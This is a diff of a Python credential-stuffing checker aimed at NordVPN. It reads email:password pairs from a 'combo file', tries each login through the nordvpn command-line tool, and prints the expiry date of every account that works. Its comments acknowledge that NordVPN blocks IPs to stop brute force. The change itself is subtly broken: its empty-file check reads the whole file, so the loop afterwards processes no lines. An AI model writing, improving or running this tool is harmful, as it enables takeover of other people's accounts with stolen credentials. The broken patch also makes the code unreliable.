@@ -39,59 +39,62 @@ subprocess.run(['nordvpn', 'logout'], capture_output=True)
 with open(combo_file_path) as combo_file:
     count = 0
 
-    if combo_file:
-        for line in combo_file:
-            count += 1
+    if not combo_file.read().strip():
+        print('Given file is empty')
+        sys.exit()
 
-            if not line.strip():  # ignore empty lines in file
-                continue
+    for line in combo_file:
+        count += 1
 
-            email, password = line.strip().split(':')    # your combo file must be separated by `:`
+        if not line.strip():  # ignore empty lines in file
+            continue
 
-            # making output more user friendly
-            print(B + f'{count}) Checking ➜', W + f'{email}:{password}\r' + E, end='')
+        email, password = line.strip().split(':')    # your combo file must be separated by `:`
 
-            login_result = subprocess.run(
-                ['nordvpn', 'login', '-u', email, '-p', password],
-                capture_output=True,
-                text=True
-            )
+        # making output more user friendly
+        print(B + f'{count}) Checking ➜', W + f'{email}:{password}\r' + E, end='')
 
-            if not login_result.returncode == 0:
-                "This means that login was not successful"
-                print(
-                    B + f'{count}) Checking ➜',
-                    W + f'{email}:{password}',
-                    '\t\t\t',
-                    R + 'Failed' + E
-                )
-                continue
+        login_result = subprocess.run(
+            ['nordvpn', 'login', '-u', email, '-p', password],
+            capture_output=True,
+            text=True
+        )
 
-            account_info = subprocess.run(
-                ['nordvpn', 'account'],
-                capture_output=True,
-                text=True
-            )
-
-            # to make sure that `nordvpn account` gives correct output
-            if 'You are not logged in.' in account_info.stdout:
-                msg = R + f"""
-                Something is wrong.
-                To prevent brute force, NordVPN blocks your IP for a while.
-                Try again later.
-                """ + E
-                print(msg)
-                sys.exit()
-
-            account_expiration_date = account_info.stdout.split('VPN Service: ')[1]
-
+        if not login_result.returncode == 0:
+            "This means that login was not successful"
             print(
                 B + f'{count}) Checking ➜',
-                W + f'{email}:{password}\t\t',
-                G + account_expiration_date.rstrip() + E
+                W + f'{email}:{password}',
+                '\t\t\t',
+                R + 'Failed' + E
             )
+            continue
 
-            subprocess.run(
-                ['nordvpn', 'logout'],
-                capture_output=True
-            )
+        account_info = subprocess.run(
+            ['nordvpn', 'account'],
+            capture_output=True,
+            text=True
+        )
+
+        # to make sure that `nordvpn account` gives correct output
+        if 'You are not logged in.' in account_info.stdout:
+            msg = R + f"""
+            Something is wrong.
+            To prevent brute force, NordVPN blocks your IP for a while.
+            Try again later.
+            """ + E
+            print(msg)
+            sys.exit()
+
+        account_expiration_date = account_info.stdout.split('VPN Service: ')[1]
+
+        print(
+            B + f'{count}) Checking ➜',
+            W + f'{email}:{password}\t\t',
+            G + account_expiration_date.rstrip() + E
+        )
+
+        subprocess.run(
+            ['nordvpn', 'logout'],
+            capture_output=True
+        )
